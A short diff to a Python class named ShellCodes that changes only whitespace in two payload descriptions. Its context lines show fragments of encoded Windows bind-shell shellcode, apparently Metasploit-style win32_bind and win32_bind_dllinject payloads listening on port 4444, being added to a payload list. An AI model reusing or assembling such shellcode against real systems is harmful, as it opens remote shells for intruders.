@@ -161,7 +161,7 @@ class ShellCodes():
         shellcode += "\xfb\xfe\xd6\x89\xfb\x1f\x35\xf3\xfb\x77\x66\xb4\x04\x22\x2d\x62"
         shellcode += "\x17\x77\x31\xe3\xfb\x88\xe6\xe3"
         self.payloads.append([
-            """win32_bind_dllinject -  EXITFUNC=seh DLL=c:\ LPORT=4444 Size=312 Encoder=Pex""",
+            """win32_bind_dllinject - EXITFUNC=seh DLL=c:\ LPORT=4444 Size=312 Encoder=Pex""",
             "socket",
             21,
             shellcode,
@@ -215,7 +215,7 @@ class ShellCodes():
         shellcode += "\x4a\x56\x42\x4f\x4c\x38\x46\x30\x4f\x35\x43\x55\x4f\x4f\x48\x4d"
         shellcode += "\x4f\x4f\x42\x4d\x5a"
         self.payloads.append([
-            """win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum""",
+            """win32_bind - EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum""",
             "socket",
             21,
             shellcode,
